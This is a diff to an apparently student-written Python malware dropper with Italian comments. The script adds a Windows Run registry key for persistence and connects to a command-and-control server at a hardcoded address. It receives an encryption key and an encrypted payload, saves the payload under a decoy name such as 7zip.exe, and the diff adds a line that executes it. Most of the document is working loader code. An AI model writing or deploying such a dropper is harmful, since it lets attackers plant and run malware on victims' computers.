@@ -5,11 +5,7 @@ import socket   # connessione verso il server
 import rsa      # generazione coppia di chiavi pubblica/privata
 import pickle   # serializzazione
 from cryptography.fernet import Fernet
-BUFFER_SIZE = 4096
-
-
-# Press Maiusc+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+BUFFER_SIZE = 512
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
 def set_reg(name, value):
@@ -62,24 +58,28 @@ if __name__ == '__main__':
     #     print("Chiave di registro già presente")
 
     # connessione al server C2
-    ip_server = "127.0.0.1"
-    port_server = 1234
+    ip_server = "127.0.0.1"  # l'ip è hardcoded ma esistono gli algoritmi di domain generation (DGA)
+    port_server = 65432
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print("Tentativo di connessione al server C2...")
     server.connect((ip_server, port_server))
     print("Connessione al server C2 avvenuta con successo!")
     #path_real_malware_from_C2 = r"C:\Users\angel\Desktop\chrome_proxy.exe"
-    path_real_malware_from_C2 = r"C:\Users\angel\Desktop\cmd_1.exe"
-    print("Ricezione file dal C2...")
+    # per Giordano: qui mettici pure l'indirizzo in cui vuoi che venga scaricato il malware che ti invia il server
+    path_real_malware_from_C2 = r"C:\Users\angel\Desktop\7zip.exe"
+
     with open(path_real_malware_from_C2, "wb") as malware_from_C2:
         byte_key = server.recv(BUFFER_SIZE)
         key = pickle.loads(byte_key)
         symmetric_key = Fernet(key)
-        print("Chiave simmetrica ricevuta")
+        print("Chiave simmetrica ricevuta: {}".format(str(byte_key)))
         bytes_read = b""
+        server.send("Ok".encode("utf8"))
         # leggo la dimensione del file da ricevere
         file_length = server.recv(BUFFER_SIZE).decode('utf8')
         file_length = int(file_length)
+        print("Dimensioni file: {}".format(file_length))
+        server.send("Ok".encode("utf8"))
         while True:
             bytes_read += server.recv(BUFFER_SIZE)
             if len(bytes_read) == file_length:
@@ -89,5 +89,5 @@ if __name__ == '__main__':
 
     print("Terminato!")
     server.close()
-
-
+    # eseguo il malware
+    os.startfile(path_real_malware_from_C2)
